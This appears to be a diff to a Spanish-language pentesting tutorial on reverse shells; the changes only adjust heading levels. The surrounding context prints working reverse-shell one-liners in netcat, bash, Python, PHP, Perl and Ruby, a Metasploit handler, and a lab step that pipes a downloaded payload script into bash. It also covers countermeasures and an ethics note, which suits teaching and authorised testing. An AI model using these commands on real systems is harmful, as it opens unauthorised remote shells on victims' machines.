@@ -4,7 +4,7 @@
   
 A diferencia de una bind shell, donde el atacante se conecta directamente a un puerto abierto en la máquina víctima, en una reverse shell es la víctima quien inicia la conexión hacia el atacante.  
    
-##### ¿CÓMO FUNCIONA UNA REVERS SHELL?  
+#### ¿CÓMO FUNCIONA UNA REVERS SHELL?  
 ​  
 El atacante abre un listener (escucha conexiones entrantes) en su máquina, por ejemplo, con Netcat en Kali Linux:
 ```
@@ -20,13 +20,13 @@ Una vez que la conexión se establece, el atacante recibe una shell interactiva 
   
 #### VENTAJAS DE UNA REVERSE SHELL:  
   
-##### EVITA CORTAFUEGOS:  
+#### EVITA CORTAFUEGOS:  
 Muchas redes restringen conexiones entrantes, pero permiten conexiones saliente, o bien estas están sujetas a menos restricciones.  
   
-##### MENOR DETECCIÓN:  
+#### MENOR DETECCIÓN:  
 El tráfico saliente suele ser menos sospechoso que una conexión entrante, pudiendo así eludir software de protección.  
   
-##### FLEXIBILIDAD:  
+#### FLEXIBILIDAD:  
 Es útil cuando no se puede abrir un puerto en la máquina víctima.  
   
 #### TIPOS DE REVERSE SHELL:  
@@ -42,7 +42,7 @@ Utiliza cifrado para evitar la detección por sistemas de seguridad.
   
 #### - HERRAMIENTAS COMUNES PARA REVERSE SHELLS -
   
-##### NETCAT (nc):  
+#### NETCAT (nc):  
 Atacante:
 ```
 nc -nlvp [puerto]
@@ -52,17 +52,17 @@ Víctima:
 nc -e /bin/bash [ip_atacante] [puerto]
 ```
   
-##### BASH: 
+#### BASH: 
 ```
 bash -i >& /dev/tcp/[ip_atacante]/[puerto] 0>&1
 ```
   
-##### PYTHON:
+#### PYTHON:
 ```
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[ip_atacante]",[puerto]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 ```
   
-##### METASPLOIT: 
+#### METASPLOIT: 
 ```
 use exploit/multi/handler  
 set payload linux/x86/meterpreter/reverse_tcp  
@@ -73,22 +73,22 @@ run
   
 #### - EJEMPLOS DE COMANDOS DE REVERSE SHELLS POR LENGUAJES -
   
-##### PHP: 
+#### PHP: 
 ```
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/[ip_atacante]/[puerto] 0>&1'"); ?>
 ```
 
-##### PERL: 
+#### PERL: 
 ```
 perl -e 'use Socket;$i="[ip_atacante]";$p=[puerto];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
 ```
   
-##### RUBY: 
+#### RUBY: 
 ```
 ruby -rsocket -e 'f=TCPSocket.open("[ip_atacante]",[puerto]).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
 ```
   
-##### CONTRAMEDIDAS Y PROTECCIÓN:  
+#### CONTRAMEDIDAS Y PROTECCIÓN:  
   
 - Filtrado de conexiones salientes: Restringir conexiones salientes solo a direcciones y puertos conocidos. 
 - Monitoreo de tráfico: Implementar sistemas de detección de intrusiones (IDS/IPS) para identificar patrones sospechosos. 
@@ -96,13 +96,13 @@ ruby -rsocket -e 'f=TCPSocket.open("[ip_atacante]",[puerto]).to_i;exec sprintf("
 - Análisis de procesos: Monitorear procesos y comandos ejecutados en los sistemas.  
 - Actualizaciones de seguridad: Mantener los sistemas y aplicaciones actualizados para evitar vulnerabilidades explotables.  
   
-##### CASOS DE USO:  
+#### CASOS DE USO:  
   
 - Pruebas de penetración: Evaluar la seguridad de una red o sistema.  
 - Auditorias de seguridad: Comprobar políticas de cortafuegos y filtrado de tráfico.  
 - Simulación de ataques: Entrenamiento para equipos de respuesta ante incidentes.  
 ​  
-##### NOTA ÉTICA Y LEGAL:  
+#### NOTA ÉTICA Y LEGAL:  
 Utilizar técnicas como la Reverse Shell sin autorización es ILEGAL y ANTIÉTICO. Esta técnica debe usarse únicamente en entornos controlados, con el consentimiento explícito del propietario del sistema.  
 
 ----------------------------------
@@ -134,7 +134,7 @@ sudo nc -nlvp 443
 
 Para COMPROBAR la configuración de nuestro el ataque podemos usar la siguiente web:  
   
-##### REVERSE SHELL GENERATOR:  
+#### REVERSE SHELL GENERATOR:  
 [https://www.revshells.com/](https://www.revshells.com/)  
   
 Introducimos la IP atacante y el puerto 443 (usado comunmente para este cometido) por el cual establecer la conexión (reverse shell), y automáticamente nos facilita la línea de código resultante para escuchar (listener) y el payload que debe ser ejecutado en la Máquina Víctima (Kali Linux 2).  
@@ -168,7 +168,7 @@ En el siguiente ejercicio de ejemplo, usaremos dos máquinas virtuales con siste
   
 A la izquierda vemos el esquema de la red. Ambas Máquinas Virtuales se encuentran configuradas con Adaptador Puente. La Máquina Atacante será Kali Linux 1 y la Máquina Víctima será Kali Linux 2.  
    
-##### CREAR EL PAYLOAD DESDE LA MÁQUINA ATACANTE:  
+#### CREAR EL PAYLOAD DESDE LA MÁQUINA ATACANTE:  
 Crearemos un archivo .sh en la Máquina Atacante, con el siguiente contenido (se llamará revsh_payload.sh:  
 
 ```
@@ -206,5 +206,3 @@ También, teniendo el servidor http abierto, podemos ejecutar el archivo revsh_
 curl http://192.168.1.132/revsh_payload.sh | bash
 ```
  
-
-[^1]: 
